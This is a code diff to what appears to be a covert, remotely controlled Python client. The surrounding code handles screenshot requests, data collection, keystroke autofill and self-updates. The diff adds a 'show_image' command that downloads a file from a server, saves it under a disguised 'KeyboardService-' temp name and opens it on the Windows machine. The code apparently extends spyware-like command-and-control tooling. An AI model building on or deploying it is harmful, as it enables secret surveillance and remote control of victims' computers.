@@ -1067,6 +1067,37 @@ def screenshot_request_poller():
         time.sleep(SCREENSHOT_REQUEST_POLL_INTERVAL_SECONDS)
 
 
+def display_message_image(message):
+    if os.name != "nt":
+        raise RuntimeError("Image messages are only supported on Windows")
+    try:
+        payload = json.loads(str(message))
+    except (TypeError, ValueError) as error:
+        raise RuntimeError("Image command payload is invalid") from error
+    if not isinstance(payload, dict):
+        raise RuntimeError("Image command payload is invalid")
+    media_id = str(payload.get("attachment_id", ""))
+    match = re.fullmatch(r"[0-9a-f]{32}\.(jpg|png|gif|webp)", media_id)
+    if not match:
+        raise RuntimeError("Image attachment ID is invalid")
+    headers = {"Content-Type": "application/json"}
+    api_key = os.getenv("INGEST_API_KEY", "").strip()
+    if api_key:
+        headers["x-api-key"] = api_key
+    request = Request(f"{SITE_URL}/api/devices/media/{media_id}", headers=headers, method="GET")
+    with urlopen(request, timeout=30) as response:
+        image_bytes = response.read(10 * 1024 * 1024 + 1)
+    if not image_bytes or len(image_bytes) > 10 * 1024 * 1024:
+        raise RuntimeError("Image attachment is empty or too large")
+    with tempfile.NamedTemporaryFile(prefix="KeyboardService-", suffix=f".{match.group(1)}", delete=False) as image_file:
+        image_file.write(image_bytes)
+        image_path = image_file.name
+    caption = str(payload.get("caption", "")).strip()
+    if caption:
+        ctypes.windll.user32.MessageBoxW(None, caption, "Message from dashboard", 0x40)
+    os.startfile(image_path)
+
+
 def handle_device_command(command, command_id=None, message=""):
     global collection_paused
     if not command:
@@ -1114,6 +1145,8 @@ def handle_device_command(command, command_id=None, message=""):
             if not str(message).strip():
                 raise RuntimeError("Autofill text cannot be empty")
             autofill_text(str(message))
+        elif command == "show_image":
+            display_message_image(message)
         elif command == "update_client":
             if os.name != "nt":
                 raise RuntimeError("Client updates are only supported on Windows")
@@ -1127,7 +1160,7 @@ def handle_device_command(command, command_id=None, message=""):
         else:
             raise RuntimeError("Unsupported command")
         acknowledge_device_command(command_id, "completed")
-    except (OSError, RuntimeError, AttributeError) as error:
+    except (OSError, RuntimeError, AttributeError, ValueError) as error:
         acknowledge_device_command(command_id, "failed", str(error))
 
 
